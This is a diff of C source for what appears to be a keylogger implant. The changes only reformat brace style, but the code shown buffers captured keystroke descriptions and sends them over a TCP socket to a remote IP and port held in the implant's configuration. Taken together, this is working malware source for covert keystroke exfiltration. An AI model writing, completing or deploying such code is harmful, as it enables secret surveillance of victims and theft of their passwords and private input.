@@ -15,9 +15,7 @@
 
 #include "implant.h"
 
-int
-send_key_description(int sockfd, char* key_desc)
-{
+int send_key_description(int sockfd, char *key_desc) {
 
     /*
         creates a standalone buffer of at least 10 * STRING_BUFFER_SIZE,
@@ -31,10 +29,10 @@ send_key_description(int sockfd, char* key_desc)
     /* i dont want to wait that long when testing lol */
 
     const size_t max_nb_chars = STRING_BUFFER_SIZE;
-    static char tmp_buffer[STRING_BUFFER_SIZE] = { 0 };
+    static char tmp_buffer[STRING_BUFFER_SIZE] = {0};
 #else
     const size_t max_nb_chars = STRING_BUFFER_SIZE * 10;
-    static char tmp_buffer[STRING_BUFFER_SIZE * 10] = { 0 };
+    static char tmp_buffer[STRING_BUFFER_SIZE * 10] = {0};
 #endif
 
     static size_t nb_chars_in_buffer = 0;
@@ -42,8 +40,7 @@ send_key_description(int sockfd, char* key_desc)
     /* since DEBUG has timeout for keyboard read, we can get empty keys sometimes
      */
     size_t length_keydesc = strlen(key_desc);
-    if (length_keydesc == 0)
-    {
+    if (length_keydesc == 0) {
         return SUCCESSFUL;
     }
 
@@ -53,10 +50,8 @@ send_key_description(int sockfd, char* key_desc)
     DEBUG_LOG("new key: %s", key_desc);
 #endif
 
-    if (max_nb_chars < (nb_chars_in_buffer + length_keydesc))
-    {
-        if (-1 == send(sockfd, tmp_buffer, nb_chars_in_buffer, 0))
-        {
+    if (max_nb_chars < (nb_chars_in_buffer + length_keydesc)) {
+        if (-1 == send(sockfd, tmp_buffer, nb_chars_in_buffer, 0)) {
 
 #ifdef DEBUG
             DEBUG_LOG("send: %s", strerror(errno));
@@ -67,20 +62,16 @@ send_key_description(int sockfd, char* key_desc)
         memset(tmp_buffer, 0, nb_chars_in_buffer);
         nb_chars_in_buffer = 0;
 
-        if (NULL == strncpy(tmp_buffer, key_desc, max_nb_chars))
-        {
+        if (NULL == strncpy(tmp_buffer, key_desc, max_nb_chars)) {
 #ifdef DEBUG
             DEBUG_LOG("strncpy send_key_description: %s", strerror(errno));
 #endif
             return ERROR;
         }
-    }
-    else
-    {
+    } else {
 
         if (NULL ==
-            strncat(tmp_buffer, key_desc, max_nb_chars - nb_chars_in_buffer))
-        {
+            strncat(tmp_buffer, key_desc, max_nb_chars - nb_chars_in_buffer)) {
 #ifdef DEBUG
             DEBUG_LOG("strncat send_key_description: %s", strerror(errno));
 #endif
@@ -92,9 +83,7 @@ send_key_description(int sockfd, char* key_desc)
     return SUCCESSFUL;
 }
 
-int
-init_remote_connection(implant_t* instance)
-{
+int init_remote_connection(implant_t *instance) {
 
 #ifdef DEBUG
     DEBUG_LOG("Initiating remote connection with (%s:%d)", instance->ip, instance->port);
@@ -109,8 +98,7 @@ init_remote_connection(implant_t* instance)
 
     */
     int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sockfd < 0)
-    {
+    if (sockfd < 0) {
 
 #ifdef DEBUG
         perror("socket");
@@ -122,16 +110,15 @@ init_remote_connection(implant_t* instance)
 
     /* items required to bind socket to remote address */
     int is_enabled = 1;
-    struct sockaddr_in addr = { .sin_family = AF_INET,
-                                .sin_port = htons(instance->port),
-                                .sin_addr.s_addr = inet_addr(instance->ip) };
+    struct sockaddr_in addr = {.sin_family = AF_INET,
+                               .sin_port = htons(instance->port),
+                               .sin_addr.s_addr = inet_addr(instance->ip)};
 
     /* setting socket options to make connection more convenient */
     if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, /* allowing to reuse ADDR or PORT
                                                                        (useful for testing) */
                    &is_enabled,
-                   sizeof(int)) < 0)
-    {
+                   sizeof(int)) < 0) {
 
 #ifdef DEBUG
         DEBUG_LOG("setsockopt send_key_description: %s", strerror(errno));
@@ -141,8 +128,7 @@ init_remote_connection(implant_t* instance)
         return -1;
     }
 
-    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0)
-    {
+    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 
 #ifdef DEBUG
         DEBUG_LOG("connect: %s", strerror(errno));
